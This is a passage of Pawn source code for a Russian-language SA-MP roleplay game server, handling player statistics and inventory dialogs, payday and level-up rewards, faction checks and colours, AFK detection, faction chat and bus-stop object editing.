	format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pMats],PlayerInfo[playerid][pDrugs],text,PlayerInfo[playerid][pApt],text1,PlayerInfo[playerid][pSmoke],str22);
    if(kek == playerid) ShowPlayerDialog(playerid,11,DIALOG_STYLE_MSGBOX,"Инвентарь",str2,"Закрыть","Назад");
    else ShowPlayerDialog(kek,0,DIALOG_STYLE_MSGBOX,"Инвентарь",str2,"Закрыть","");
    return true;
}

function OffStatic(playerid,nick[])
{
    if(cache_get_row_count(mysql)>0)
    {
        new level = cache_get_field_content_int(0, "level", mysql);
        new wanted = cache_get_field_content_int(0, "wanted", mysql);
        new exp = cache_get_field_content_int(0, "exp", mysql);
        new phone = cache_get_field_content_int(0, "phone", mysql);
        new member = cache_get_field_content_int(0, "member", mysql);
        new rank1 = cache_get_field_content_int(0, "rank", mysql);
        new mask = cache_get_field_content_int(0, "mask", mysql);
        new kan = cache_get_field_content_int(0, "kan", mysql);
        new zakon = cache_get_field_content_int(0, "zakon", mysql);
        
        new cash = cache_get_field_content_int(0, "cash", mysql);
        new mats = cache_get_field_content_int(0, "mats", mysql);
        new drugs = cache_get_field_content_int(0, "drugs", mysql);
        new apt = cache_get_field_content_int(0, "apt", mysql);
        new bank = cache_get_field_content_int(0, "bank", mysql);
        new voz = cache_get_field_content_int(0, "voz", mysql);
        new phonebal = cache_get_field_content_int(0, "phonebal", mysql);
        new warn = cache_get_field_content_int(0, "warn", mysql);
        new year, month, day, hour, minute, second,year1, month1, day1, hour1, minute1, second1;
        TimestampToDate(cache_get_field_content_int(0, "reg", mysql), year, month, day, hour, minute, second,0);
        TimestampToDate(cache_get_field_content_int(0, "ig", mysql), year1, month1, day1, hour1, minute1, second1,0);
        
		new sled = level*4 - exp;
		new krek[10],frac[50],rank[50],house2[50],biz[50];
		new house = 0,house1 = 0;
		for(new i = 1; i <= TOTALBIZ;i++)
		{
			if(strcmp(nick, BizInfo[i][bOwner], true) == 0) house = i;
		}
		if(house > 0) format(biz,sizeof(biz),"%s",BizInfo[house][bName]);
		else format(biz,sizeof(biz),"Нет");
		for(new i = 1; i <= TOTALHOUSE;i++)
		{
			if(strcmp(nick, HInfo[i][hOwner], true) == 0) house = i;
		}
		for(new i = 1; i <= TOTALHOUSE;i++)
		{
			if(strcmp(nick, HInfo[i][hZasel1], true) == 0) house = i;
			else if(strcmp(nick, HInfo[i][hZasel2], true) == 0) house = i;
			else if(strcmp(nick, HInfo[i][hZasel3], true) == 0) house = i;
			else if(strcmp(nick, HInfo[i][hZasel4], true) == 0) house = i;
		}
		for(new i = 1; i <= TOTALKOM;i++)
		{
			if(strcmp(nick, KomInfo[i][kOwner], true) == 0) house1 = i;
		}
		if(house > 0 && house1 == 0) format(house2,sizeof(house2),"Дом №%i",house);
		if(house1 > 0 && house == 0) format(house2,sizeof(house2),"Команта №%i (%s)",KomInfo[house][kNum],BizInfo[KomInfo[house][kbiz]][bName]);
		if(!house1 && !house) format(house2,sizeof(house2),"Нет");
		if(PlayerInfo[playerid][pPhone] == 0) format(krek,sizeof(krek),"Нет");
		else format(krek,sizeof(krek),"%i",phone);
		if(PlayerInfo[playerid][pMember] > 0)
		{
			format(frac,sizeof(frac),"%s",FracInfo[member][fName]);
			format(rank,sizeof(rank),"%s",FracRank[member][rank1]);
		}
		else
		{
			format(frac,sizeof(frac),"Гражданский");
			format(rank,sizeof(rank),"Нет");
		}
		new text[10];
		switch(mask)
		{
			case 0: text = "Нет";
			case 1: text = "Есть";
		}
		new text1[10];
		switch(kan)
		{
			case 0: text1 = "Нет";
			case 1: text1 = "Есть";
		}
		//================
		query = "";
		new str[250];
		format(str,sizeof(str),"{f7ae11}Основная информация:\n{FFFFFF}\tНик:\t\t\t\t%s\n\tУровень:\t\t\t%i\n\tНовый уровень:\t\tчерез %i час(ов)\n\tПредупреждения:\t\t%i\n\tДата регистрации:\t\t%02d/%02d/%02d %02d:%02d:%02d\n\tДата последней игры:\t%02d/%02d/%02d %02d:%02d:%02d\n\n",nick,level,sled,warn,day,month,year,hour, minute, second,day1,month1,year1,hour1, minute1, second1);
		strcat(query,str);
		str = "";
		format(str,sizeof(str),"{f7ae11}Статистика аккаунта:\n{FFFFFF}\tВозраст:\t\t\t%i\n\tНаличные:\t\t\t$%i\n\tНа счету:\t\t\t$%i\n\tНомер телефона:\t\t%s\n\tМобильный баланс:\t\t$%i\n\tЗаконопослушность:\t\t%i\n\t",voz,cash,bank,krek,phonebal,zakon);
	    strcat(query,str);
		str = "";
		format(str,sizeof(str),"Уровень розыска:\t\t%i\n\tМатериалы:\t\t\t%i\n\tНаркотики:\t\t\t%i\n\tМаска:\t\t\t\t%s\n\tАптечки:\t\t\t%i\n\tКанистра:\t\t\t%s\n\n",wanted,mats,drugs,text,apt,text1);
	    strcat(query,str);
		str = "";
	    format(str,sizeof(str),"{f7ae11}Детальная информация:\n{FFFFFF}\tОрганизация:\t\t\t%s\n\tДолжность:\t\t\t%s\n\tЖилье:\t\t\t%s\n\tБизнес:\t\t\t%s",frac,rank,house2,biz);
	    strcat(query,str);
		str = "";
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Статистика персонажа",query,"Закрыть","");
    }
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
    return 1;
}
stock Stats1(playerid,name[])
{
    query = "";
    format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", name);
	mysql_tquery(mysql, query, "OffStatic", "ds",playerid,name);
	//=============== переменые ============
/*	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", name);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(!mysql_fetch_row_format(query))
	{
		SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
	    mysql_free_result();
	    return true;
	}
	new level,wanted,exp,phone,member,rank1,datereg[30],dateig[30],mask,kan,zakon,cash,mats,drugs,apt,bank,voz,phonebal,tr[10],warn;
	mysql_get_field("reg", datereg);
	mysql_get_field("ig", dateig);
	mysql_get_field("level", tr), level = strval(tr);
	mysql_get_field("wanted", tr), wanted = strval(tr);
	mysql_get_field("exp", tr), exp = strval(tr);
	mysql_get_field("phone", tr), phone = strval(tr);
	mysql_get_field("member", tr), member = strval(tr);
	mysql_get_field("rank", tr), rank1 = strval(tr);
	mysql_get_field("mask", tr), mask = strval(tr);
	mysql_get_field("kan", tr), kan = strval(tr);
	mysql_get_field("zakon", tr), zakon = strval(tr);
	mysql_get_field("cash", tr), cash = strval(tr);
	mysql_get_field("mats", tr), mats = strval(tr);
	mysql_get_field("drugs", tr), drugs = strval(tr);
	mysql_get_field("apt", tr), apt = strval(tr);
	mysql_get_field("bank", tr), bank = strval(tr);
	mysql_get_field("voz", tr), voz = strval(tr);
	mysql_get_field("phonebal", tr), phonebal = strval(tr);
	mysql_get_field("warn", tr), warn = strval(tr);
	new sled = level*4 - exp;
	new krek[10],frac[50],rank[50],house2[50],biz[50];
	new house = 0,house1 = 0;
	for(new i = 1; i <= TOTALBIZ;i++)
	{
		if(strcmp(name, BizInfo[i][bOwner], true) == 0) house = i;
	}
	if(house > 0) format(biz,sizeof(biz),"%s",BizInfo[house][bName]);
	else format(biz,sizeof(biz),"Нет");
	for(new i = 1; i <= TOTALHOUSE;i++)
	{
		if(strcmp(name, HInfo[i][hOwner], true) == 0) house = i;
	}
	for(new i = 1; i <= TOTALHOUSE;i++)
	{
		if(strcmp(name, HInfo[i][hZasel1], true) == 0) house = i;
		else if(strcmp(name, HInfo[i][hZasel2], true) == 0) house = i;
		else if(strcmp(name, HInfo[i][hZasel3], true) == 0) house = i;
		else if(strcmp(name, HInfo[i][hZasel4], true) == 0) house = i;
	}
	for(new i = 1; i <= TOTALKOM;i++)
	{
		if(strcmp(name, KomInfo[i][kOwner], true) == 0) house1 = i;
	}
	if(house > 0 && house1 == 0) format(house2,sizeof(house2),"Дом №%i",house);
	if(house1 > 0 && house == 0) format(house2,sizeof(house2),"Команта №%i (%s)",KomInfo[house][kNum],BizInfo[KomInfo[house][kbiz]][bName]);
	if(!house1 && !house) format(house2,sizeof(house2),"Нет");
	if(PlayerInfo[playerid][pPhone] == 0) format(krek,sizeof(krek),"Нет");
	else format(krek,sizeof(krek),"%i",phone);
	if(PlayerInfo[playerid][pMember] > 0)
	{
		format(frac,sizeof(frac),"%s",FracInfo[member][fName]);
		format(rank,sizeof(rank),"%s",FracRank[member][rank1]);
	}
	else
	{
		format(frac,sizeof(frac),"Гражданский");
		format(rank,sizeof(rank),"Нет");
	}
	new reg[6],ig[6];
 	sscanf(datereg, "p<,>a<i>[5]",reg);
 	sscanf(dateig, "p<,>a<i>[5]",ig);
	new text[10];
	switch(mask)
	{
		case 0: text = "Нет";
		case 1: text = "Есть";
	}
	new text1[10];
	switch(kan)
	{
		case 0: text1 = "Нет";
		case 1: text1 = "Есть";
	}
	//================
	new str1[700];
	new str[250];
	format(str,sizeof(str),"{f7ae11}Основная информация:\n{FFFFFF}\tНик:\t\t\t\t%s\n\tУровень:\t\t\t%i\n\tНовый уровень:\t\tчерез %i час(ов)\n\tПредупреждения:\t\t%i\n\tДата регистрации:\t\t%02d/%02d/%02d %02d:%02d:%02d\n\tДата последней игры:\t%02d/%02d/%02d %02d:%02d:%02d\n\n",name,level,sled,warn,reg[0],reg[1],reg[2],reg[3],reg[4],reg[5],ig[0],ig[1],ig[2],ig[3],ig[4],ig[5]);
	strcat(str1,str);
	str = "";
	format(str,sizeof(str),"{f7ae11}Статистика аккаунта:\n{FFFFFF}\tВозраст:\t\t\t%i\n\tНаличные:\t\t\t$%i\n\tНа счету:\t\t\t$%i\n\tНомер телефона:\t\t%s\n\tМобильный баланс:\t\t$%i\n\tЗаконопослушность:\t\t%i\n\t",voz,cash,bank,krek,phonebal,zakon);
    strcat(str1,str);
	str = "";
	format(str,sizeof(str),"Уровень розыска:\t\t%i\n\tМатериалы:\t\t\t%i\n\tНаркотики:\t\t\t%i\n\tМаска:\t\t\t\t%s\n\tАптечки:\t\t\t%i\n\tКанистра:\t\t\t%s\n\n",wanted,mats,drugs,text,apt,text1);
    strcat(str1,str);
	str = "";
    format(str,sizeof(str),"{f7ae11}Детальная информация:\n{FFFFFF}\tОрганизация:\t\t\t%s\n\tДолжность:\t\t\t%s\n\tЖилье:\t\t\t%s\n\tБизнес:\t\t\t%s",frac,rank,house2,biz);
    strcat(str1,str);
	str = "";
	ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Статистика персонажа",str1,"Закрыть","");
	*/
	return true;
}
stock Stats(kek,playerid)
{
	//=============== переменые ============
	new sled = PlayerInfo[playerid][pLevel]*4 - PlayerInfo[playerid][pExp];
	new krek[10],frac[50],rank[50],house[50],biz[50];
	if(GetPlayerBiz(playerid)) format(biz,sizeof(biz),"%s",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bName]);
	else format(biz,sizeof(biz),"Нет");
	if(GetPlayerHouse(playerid) || GetPlayerZasel(playerid)) format(house,sizeof(house),"Дом №%i",GetPVarInt(playerid,"PlayerHouse"));
	else if(GetPlayerKom(playerid)) format(house,sizeof(house),"Команта №%i (%s)",KomInfo[GetPVarInt(playerid,"PlayerKom")][kNum],BizInfo[KomInfo[GetPVarInt(playerid,"PlayerKom")][kbiz]][bName]);
	else format(house,sizeof(house),"Нет");
	if(PlayerInfo[playerid][pPhone] == 0) format(krek,sizeof(krek),"Нет");
	else format(krek,sizeof(krek),"%i",PlayerInfo[playerid][pPhone]);
	if(PlayerInfo[playerid][pMember] > 0)
	{
		format(frac,sizeof(frac),"%s",FracInfo[PlayerInfo[playerid][pMember]][fName]);
		format(rank,sizeof(rank),"%s",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]]);
	}
	else
	{
		format(frac,sizeof(frac),"Гражданский");
		format(rank,sizeof(rank),"Нет");
	}
	new year, month, day, hour, minute, second,year1, month1, day1, hour1, minute1, second1;
 	
 	TimestampToDate(PlayerInfo[playerid][pDateReg], year, month, day, hour, minute, second,0);
 	TimestampToDate(PlayerInfo[playerid][pDateIg], year1, month1, day1, hour1, minute1, second1,0);
 	
	new text[10];
	switch(PlayerInfo[playerid][pMask])
	{
		case 0: text = "Нет";
		case 1: text = "Есть";
	}
	new text1[10];
	switch(PlayerInfo[playerid][pKan])
	{
		case 0: text1 = "Нет";
		case 1: text1 = "Есть";
	}
	//================
	query = "";
	new str[250];
	format(str,sizeof(str),"{f7ae11}Основная информация:\n{FFFFFF}\tНик:\t\t\t\t%s\n\tУровень:\t\t\t%i\n\tНовый уровень:\t\tчерез %i час(ов)\n\tПредупреждения:\t\t%i\n\tДата регистрации:\t\t%02d/%02d/%02d %02d:%02d:%02d\n\tДата последней игры:\t%02d/%02d/%02d %02d:%02d:%02d\n\n",PlayerInfo[playerid][pSendername],PlayerInfo[playerid][pLevel],sled,PlayerInfo[playerid][pWarn],day,month,year,hour,minute, second,day1,month1,year1,hour1,minute1, second1);
	strcat(query,str);
	str = "";
	format(str,sizeof(str),"{f7ae11}Статистика аккаунта:\n{FFFFFF}\tВозраст:\t\t\t%i\n\tНаличные:\t\t\t$%i\n\tНа счету:\t\t\t$%i\n\tНомер телефона:\t\t%s\n\tМобильный баланс:\t\t$%i\n\tЗаконопослушность:\t\t%i\n\t",PlayerInfo[playerid][pVoz],PlayerInfo[playerid][pCash],PlayerInfo[playerid][pBank],krek,PlayerInfo[playerid][pPhoneBal],PlayerInfo[playerid][pZakon]);
    strcat(query,str);
	str = "";
	format(str,sizeof(str),"Уровень розыска:\t\t%i\n\tМатериалы:\t\t\t%i\n\tНаркотики:\t\t\t%i\n\tМаска:\t\t\t\t%s\n\tАптечки:\t\t\t%i\n\tКанистра:\t\t\t%s\n\n",PlayerInfo[playerid][pWanted],PlayerInfo[playerid][pMats],PlayerInfo[playerid][pDrugs],text,PlayerInfo[playerid][pApt],text1);
    strcat(query,str);
	str = "";
    format(str,sizeof(str),"{f7ae11}Детальная информация:\n{FFFFFF}\tОрганизация:\t\t\t%s\n\tДолжность:\t\t\t%s (%d)\n\tЖилье:\t\t\t%s\n\tБизнес:\t\t\t%s",frac,rank,PlayerInfo[playerid][pRank],house,biz);
    strcat(query,str);
	str = "";
	if(kek == playerid) ShowPlayerDialog(kek,11,DIALOG_STYLE_MSGBOX,"Статистика персонажа",query,"Закрыть","Назад");
	else ShowPlayerDialog(kek,0,DIALOG_STYLE_MSGBOX,"Статистика персонажа",query,"Закрыть","");
	return true;
}

stock PayDay(playerid)
{
	new check = 0;
	PlayerInfo[playerid][pMin] = 0;
	new ghour1,gminute1,gsecond1;
	gettime(ghour1,gminute1,gsecond1);
	if(PlayerInfo[playerid][pMember] > 0)
	{
	    printf("FracPay: %d Plus: %d",FracPay[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],FracPay[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]]*FracInfo[PlayerInfo[playerid][pMember]][fPayDay]/100);
	    
	    check = FracPay[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]] + FracPay[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]]*FracInfo[PlayerInfo[playerid][pMember]][fPayDay]/100;
        printf("1 check: %d",check);
 		if(IsAMafia(playerid) || IsAGang(playerid))
		{
		    
			if(FracBank[PlayerInfo[playerid][pMember]] < check)  check = 0,SendClientMessage(playerid,CYELLOW,"В общаке кончились деньги");
			else FracBank[PlayerInfo[playerid][pMember]] -= check;
		}
		else
		{
			if(Kazna < check) check = 0,SendClientMessage(playerid,CYELLOW,"В казне кончились деньги");
			else Kazna -= check;
		}
	}
	printf("Payday: %d",PlayerInfo[playerid][pPayDay]);
	PlayerInfo[playerid][pZakon]++;
	printf("2 check: %d",check);
	if(PlayerInfo[playerid][pFVig])
	{
	    printf("FV: %d check: %d check*PlayerInfo[playerid][pFVig]*10/100: %d obsh: %d",PlayerInfo[playerid][pFVig],check,check*PlayerInfo[playerid][pFVig]*10/100,check - check*PlayerInfo[playerid][pFVig]*10/100);
		check = check - check*PlayerInfo[playerid][pFVig]*10/100;
	}
	if(PlayerInfo[playerid][pLWarn])
	{
	    printf("LW: %d check: %d check*PlayerInfo[playerid][pLWarn]*10/10: %d obsh: %d",PlayerInfo[playerid][pLWarn],check,check*PlayerInfo[playerid][pLWarn]*10/10,check - check*PlayerInfo[playerid][pLWarn]*10/100);
		check = check - check*PlayerInfo[playerid][pLWarn]*10/100;
	}
	printf("Payday: %d check: %d",PlayerInfo[playerid][pPayDay],check);
	PlayerInfo[playerid][pPayDay] += check;

	SendClientMessage(playerid,CGREY,"|_________[Чек Банка]_________|");
	static const fmt_string1[] = "Зарплата: {FFFFFF}$%i";
	new str1[sizeof(fmt_string1)+7];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pPayDay]);
	SendClientMessage(playerid,CREWARD,str1);
	if(PlayerInfo[playerid][pBankPin]) PlayerInfo[playerid][pBank] += PlayerInfo[playerid][pPayDay];
	else GiveMoney(playerid,PlayerInfo[playerid][pPayDay]);
	PlayerInfo[playerid][pPayDay] = 0;
	static const fmt_string2[] = "Текущий баланс: {FFFFFF}$%i";
	new str2[sizeof(fmt_string2)+10];
	format(str2, sizeof(str2), fmt_string2,(PlayerInfo[playerid][pBankPin]) ? (PlayerInfo[playerid][pBank]) : (PlayerInfo[playerid][pCash]));
	SendClientMessage(playerid,CREWARD,str2);
	PlayerInfo[playerid][pPayDay] = 0;
	if(PlayerInfo[playerid][pPhone] > 0)
	{
		static const fmt_string3[] = "Мобильный счет: {FFFFFF}$%i";
		new str3[sizeof(fmt_string3)+7];
		format(str3, sizeof(str3), fmt_string3,PlayerInfo[playerid][pPhoneBal]);
		SendClientMessage(playerid,CREWARD,str3);
	}
	SendClientMessage(playerid,CGREY,"|____________________________|");
	new exp;
	if(optx2) exp = 2;
	if(PlayerInfo[playerid][pVip] > gettime()) exp = 2;
	if(PlayerInfo[playerid][pCode] == 1 && 3 > PlayerInfo[playerid][pLevel] > 0) exp = 2;
	if(PlayerInfo[playerid][pCode] == 1 && 4 > PlayerInfo[playerid][pLevel] > 1) exp = 3;
	if(PlayerInfo[playerid][pCode] == 2 && 10 > PlayerInfo[playerid][pLevel] > 5) exp = 2;
	if(PlayerInfo[playerid][pCode] == 3 && 8 > PlayerInfo[playerid][pLevel] > 4) exp = 3;
	PlayerInfo[playerid][pExp]+= exp;
	CheckLVL(playerid);
 	new days,mon,yer;
  	getdate(yer,mon,days);
	if(PlayerInfo[playerid][pDateO] != days)
	{
		PlayerInfo[playerid][pOnline] = 0;
	 	PlayerInfo[playerid][pDateO] = days;
	}
	if(PlayerInfo[playerid][pDateM] != mon)
	{
		PlayerInfo[playerid][pOnlineMes] = 0;
		PlayerInfo[playerid][pDateM] = mon;
	}
	PlayerInfo[playerid][pOnlineMes]++;
	PlayerInfo[playerid][pOnline]++;
 //	UpdateMat(PlayerInfo[playerid][pMember]);
	SaveAccount(playerid);
	return true;
}
stock CheckLVL(playerid)
{
	if(PlayerInfo[playerid][pExp] >= PlayerInfo[playerid][pLevel]*4)
	{
		PlayerInfo[playerid][pLevel]++;
		if(PlayerInfo[playerid][pCode] == 3 && PlayerInfo[playerid][pLevel] == 2) GiveMoney(playerid,40000);
		if(PlayerInfo[playerid][pCode] == 3 && PlayerInfo[playerid][pLevel] == 9) GiveMoney(playerid,80000);
		if(PlayerInfo[playerid][pCode] == 1 && PlayerInfo[playerid][pLevel] == 3)
		{
		    GiveMoney(playerid,50000);
			if(PlayerInfo[playerid][pGunSkill][1] < 650) PlayerInfo[playerid][pGunSkill][1] = 650;
			if(PlayerInfo[playerid][pGunSkill][2] < 650) PlayerInfo[playerid][pGunSkill][2] = 650;
		  	if(PlayerInfo[playerid][pGunSkill][5] < 650) PlayerInfo[playerid][pGunSkill][5] = 650;
		}
		if(PlayerInfo[playerid][pCode] == 2 && PlayerInfo[playerid][pLevel] == 3) GiveMoney(playerid,50000);
		if(PlayerInfo[playerid][pCode] == 2 && PlayerInfo[playerid][pLevel] == 6) GiveMoney(playerid,80000);
		PlayerInfo[playerid][pExp] -= (PlayerInfo[playerid][pLevel]-1)*4;
		PlayerInfo[playerid][pVoz]++;
		SetPlayerScore(playerid,PlayerInfo[playerid][pLevel]);
		SendClientMessage(playerid,CREWARD,"Поздравляю! Вы повысили свой уровень");
		if(PlayerInfo[playerid][pLevel] == 2 && strcmp(PlayerInfo[playerid][pPriglas],"None",true))
		{
		    new ipstr[16];
		    GetPlayerIp( playerid, ipstr, 16 );
		    if(GetPlayerID(PlayerInfo[playerid][pPriglas]) != INVALID_PLAYER_ID)
			{
				if(strcmp(ipstr,PlayerInfo[GetPlayerID(PlayerInfo[playerid][pPriglas])][pIpReg],true)) GiveMoney(GetPlayerID(PlayerInfo[playerid][pPriglas]),2500);
			}
		    else
		    {
		        query = "";
		        format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", PlayerInfo[playerid][pPriglas]);
				mysql_tquery(mysql, query, "CheckRef", "ds", playerid,ipstr);

			/*	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", PlayerInfo[playerid][pPriglas]);
				mysql_tquery(mysql,query);
				mysql_store_result();
				if(mysql_fetch_row_format(query))
				{
					new warn[10],war1,ip[16];
					mysql_get_field("cash", warn),war1 = strval(warn);
					mysql_get_field("ipreg", ip);
					if(strcmp(ipstr,ip,true)) SetPlayerInt(PlayerInfo[playerid][pPriglas],"cash",war1+2500);
				}
				mysql_free_result();*/
			}
		}
	}
	return 1;
}
stock IsACapture(playerid)
{
	new member = PlayerInfo[playerid][pMember];
	if(member== F_GROVE || member== F_LCN || member== F_BIKERS || member == F_AZTECAS || member == F_YAKUZA|| member == F_RM) return true;
	return false;
}
stock IsAGang(playerid)
{
	new member = PlayerInfo[playerid][pMember];
	if(member== F_GROVE || member== F_BALLAS || member == F_AZTECAS || member == F_VAGOS|| member == F_RIFA) return true;
	return false;
}
stock IsAMafia(playerid)
{
	new member = PlayerInfo[playerid][pMember];
	if(member== F_LCN || member== F_YAKUZA || member== F_RM || member== F_BIKERS) return true;
	return false;
}
stock SetGolod(playerid,am)
{
	PlayerInfo[playerid][pGolod] = am;
	SetProgressBarValue(Golod, PlayerInfo[playerid][pGolod]);
	UpdateProgressBar(Golod, playerid);
	return true;
}
stock GiveGolod(playerid,am)
{
	PlayerInfo[playerid][pGolod] += am;
	if(PlayerInfo[playerid][pGolod] > 100) PlayerInfo[playerid][pGolod] = 100;
	SetProgressBarValue(Golod, PlayerInfo[playerid][pGolod]);
	UpdateProgressBar(Golod, playerid);
	return true;
}
stock SetArmour(playerid,Float:am)
{
	PlayerInfo[playerid][pArm] = am;
	SetPlayerArmour(playerid,am);
//	if(PlayerInfo[playerid][pMember] == F_LVPD || PlayerInfo[playerid][pMember] == F_ARMY) PlayerArmour(playerid);
    return true;
}
stock SetHealth(playerid,Float:am)
{
	PlayerInfo[playerid][pHeal] = am;
	SetPlayerHealth(playerid,am);
    return true;
}

stock SetColor(playerid)
{
	switch(PlayerInfo[playerid][pMember])
	{
		case F_MAYOR: SetPlayerColor(playerid, 0xEEEEEEAA);
		case F_LVPD: SetPlayerColor(playerid, 0x74C1FAAA);
		case F_FBI: SetPlayerColor(playerid, 0x61A3DBAA);
		case F_HOSPITAL_LS: SetPlayerColor(playerid, 0xFE7373AA);
		case F_LIC: SetPlayerColor(playerid, 0xB5DEFCAA);
		case F_GROVE: SetPlayerColor(playerid, 0x10DC29AA);
		case F_BALLAS: SetPlayerColor(playerid, 0x8813E7AA);
		case F_BIKERS: SetPlayerColor(playerid, 0xC6AC6EAA);
		case F_AZTECAS: SetPlayerColor(playerid, 0x01FCFFAA);
		case F_VAGOS: SetPlayerColor(playerid, 0xDBD604AA);
		case F_ARMY: SetPlayerColor(playerid, 0x331b06AA);
		case F_LCN: SetPlayerColor(playerid, 0x454545AA);
		case F_RM: SetPlayerColor(playerid, 0xAFAFAFAA);
		case F_NEWS: SetPlayerColor(playerid, 0xFF924AAA);
		case F_YAKUZA: SetPlayerColor(playerid, 0xA31C1CAA);
		case F_RIFA: SetPlayerColor(playerid, 0x83BFBFAA);
	}
}

stock GlobalAfkCheck()
{
    static const fmt_string1[] = "AFK: %s сек";
	new str1[sizeof(fmt_string1)+10]; //"Sleep"
	for(new i; i != MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || IsPlayerNPC(i)) continue;
		if(GetPVarInt(i,"AFK_Tick") > 10000)
		{
			SetPVarInt(i,"AFK_Tick",1);
			SetPVarInt(i,"AFK_Check",0);
		}
		if(GetPVarInt(i,"AFK_Use") == 1 && GetPVarInt(i, "AFK_Time") <= 2) SetPVarInt(i,"AFK_Use",0);
		if(GetPVarInt(i,"AFK_Check") < GetPVarInt(i,"AFK_Tick") && GetPlayerState(i))
		{
			SetPVarInt(i,"AFK_Check",GetPVarInt(i,"AFK_Tick"));
			SetPVarInt(i,"AFK_Time",0);
		}
		if(GetPVarInt(i,"AFK_Check") == GetPVarInt(i,"AFK_Tick") && GetPlayerState(i))
		{
			SetPVarInt(i,"AFK_Time",GetPVarInt(i,"AFK_Time") + 1);
			if(GetPVarInt(i, "AFK_Time") > 2)
			{
			    new stringText[10];
				Convert(GetPVarInt(i,"AFK_Time")-2, stringText);
				
			   	format(str1, sizeof(str1), fmt_string1,stringText);
				SetPlayerChatBubble(i,str1,CREWARD,15.0,1200);
				SetPVarInt(i,"AFK_Use",1);
			}
		}
	}
}
stock SendDMes(str[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == false || GetPVarInt(i,"ChatD")) continue;
		if(PlayerInfo[i][pWork] > 0)
		{
			if(IsACop(i) || PlayerInfo[i][pMember] == F_MAYOR || IsAArmy(i)|| PlayerInfo[i][pMember] == F_HOSPITAL_LS || PlayerInfo[i][pMember] == F_LIC) SendClientMessage(i, 0xF0A2A0FF, str);
		}
	}
}
stock IsACop(playerid)
{
	new member = PlayerInfo[playerid][pMember];
	if(member== F_LVPD || member== F_FBI|| member== F_LSPD) return true;
	return false;
}
stock IsACop1(playerid)
{
	new member = PlayerInfo[playerid][pMember];
	if(member== F_LVPD && PlayerInfo[playerid][pRank] > 1 || member== F_FBI && PlayerInfo[playerid][pRank] > 1) return true;
	return false;
}
stock IsAGos(playerid)
{
    new member = PlayerInfo[playerid][pMember];
	if(member== F_LVPD || member== F_FBI || member ==F_HOSPITAL_LS || member ==F_NEWS || IsAArmy(playerid) || member == F_LIC || member == F_MAYOR || member == F_LSPD) return true;
	return false;
}
stock IsAArmy(playerid)
{
	new member = PlayerInfo[playerid][pMember];
	if(member== F_ARMY) return true;
	return false;
}
stock SendFamMessage(family,color, str[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == false ||  GetPVarInt(i,"ChatS")) continue;
		if(PlayerInfo[i][pFam] == family) SendClientMessage(i, color, str);
	}
	return true;
}
stock SendRMes(color, str[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == false ||  !GetPVarInt(i,"FR")) continue;
		SendClientMessage(i, color, str);
	}
	return true;
}
stock SendFMes(family,color, str[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == false || GetPVarInt(i,"ChatF")) continue;
		if(CheckF[i] == family) SendClientMessage(i, color, str);
		if(GetPVarInt(i,"Pros") == family) SendClientMessage(i, CREWARD, str);
		else
		{
			if(IsACop(i) || PlayerInfo[i][pMember] == F_MAYOR || IsAArmy(i) ||  PlayerInfo[i][pMember] ==F_HOSPITAL_LS || PlayerInfo[i][pMember] ==F_NEWS)
			{
				if(PlayerInfo[i][pWork] > 0) if(PlayerInfo[i][pMember] == family) SendClientMessage(i, color, str);
			}
			else if(PlayerInfo[i][pMember] == family) SendClientMessage(i, color, str);
		}
	}
	return true;
}
public OnPlayerEditDynamicObject(playerid, STREAMER_TAG_OBJECT objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	new Float:oldX, Float:oldY, Float:oldZ,
	Float:oldRotX, Float:oldRotY, Float:oldRotZ;
	GetDynamicObjectPos(objectid, oldX, oldY, oldZ);
	GetDynamicObjectRot(objectid, oldRotX, oldRotY, oldRotZ);
	MoveDynamicObject(objectid, x, y, z, 10.0, rx, ry, rz);
	if(GetPVarInt(playerid,"ObjStop"))
	{
	    if(response == EDIT_RESPONSE_FINAL)
	    {
		
			new names[32];
			GetPVarString(playerid,"NameBus",names,sizeof(names));
			query = "";
			format(query, sizeof(query), "INSERT INTO stops (x,y,z,name) VALUES ('%f','%f','%f','%s')", x,y,z,names);
			mysql_tquery(mysql,query);
			SendClientMessage(playerid,-1,"Вы установили новую остановку");
			DeletePVar(playerid,"ObjStop");
			DeletePVar(playerid,"NameBus");
		}
		if(response == EDIT_RESPONSE_CANCEL)
		{
		    DestroyDynamicObject(objectid);
		    DeletePVar(playerid,"ObjStop");
			DeletePVar(playerid,"NameBus");
		}
	}
	if(GetPVarInt(playerid,"ModelEdit"))
	{
	    if(response == EDIT_RESPONSE_FINAL)
	    {
			new Float:pos[4];
			GetVehiclePos(GetPlayerVehicleID(playerid), pos[0], pos[1], pos[2]);
			GetVehicleZAngle(GetPlayerVehicleID(playerid), pos[3]);

			new Float:new_pos[4];
			new_pos[0] = x - pos[0];
			new_pos[1] = y - pos[1];
			new_pos[2] = z - pos[2];
